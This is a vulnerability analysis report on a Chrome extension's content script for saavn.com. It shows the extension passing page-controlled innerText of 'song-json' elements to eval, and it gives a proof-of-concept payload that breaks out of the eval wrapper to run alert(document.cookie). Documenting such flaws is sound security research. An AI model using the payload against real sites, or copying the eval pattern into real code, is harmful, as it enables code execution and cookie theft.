# CoCo Analysis: ojakdafcdblnebecmoelanfkfmdackgf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_body_innerText → eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ojakdafcdblnebecmoelanfkfmdackgf/opgen_generated_files/cs_1.js
Line 29    Document_element.prototype.innerText = new Object();
Line 504   var obj = eval("(" + songJSONDivs[i].innerText + ")");

**Code:**

```javascript
// Content script cs_1.js (cs_saavn.js) - runs on www.saavn.com
function fetchTrackInfo(callback) {
    Name = album = Artist1 = ImgSrc = '';
    if(document.getElementById('player-track-name') !== null){
        Name = document.getElementById('player-track-name').innerText;
        album = document.getElementById('player-album-name').innerText;
    }
    else{
        Name = 'noName';
    }
    var songJSONDivs = $(".song-json"); // ← attacker-controlled: webpage can inject elements with class "song-json"
    for (var i = 0; i < songJSONDivs.length; i++) {
        var obj = eval("(" + songJSONDivs[i].innerText + ")"); // ← EVAL SINK with attacker-controlled data
        if (obj.title.trim() === Name.trim()) {
            var singers = obj.singers;
            var commaIndex = singers.indexOf(",");
            Artist1 = (commaIndex === -1)?singers:singers.substring(0, commaIndex);
        }
    }
    ImgSrc = $('#now-playing').find('.key-art').css('background-image').replace('url('+'"','').replace('"'+')','');
    callback();
}

// Called from setInterval every 2 seconds
setInterval(function() {
    var prevName = Name;
    fetchTrackInfo(function(){
        if (Name !== prevName && (Name !=='' || Name !== undefined)) {
            chrome.runtime.sendMessage( {'msg' : 'trackInfo','artist' : Artist1,'title' : Name,'album' : album,'imgsrc':ImgSrc});
        }
    });
}, 2000);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM manipulation - the extension's content script runs on www.saavn.com and evaluates the innerText of DOM elements with class "song-json". A malicious version of saavn.com (or via XSS on saavn.com) can inject arbitrary JavaScript code.

**Attack:**

```javascript
// On www.saavn.com (or attacker-controlled site matching the content_scripts pattern)
// Inject malicious element with class "song-json"
var maliciousDiv = document.createElement('div');
maliciousDiv.className = 'song-json';
maliciousDiv.innerText = '{"title":"x","singers":"y"}); alert(document.cookie); ({"title":"x","singers":"y"}';
document.body.appendChild(maliciousDiv);

// When the extension's setInterval calls fetchTrackInfo (every 2 seconds),
// it will execute: eval("(" + maliciousDiv.innerText + ")")
// This executes arbitrary JavaScript in the content script context
```

**Impact:** Arbitrary code execution in the content script context with access to the extension's APIs and the ability to communicate with the background page. The attacker can steal data, manipulate extension behavior, send messages to the background script, and access all permissions granted to the extension (tabs, http://*/*, https://*/*).
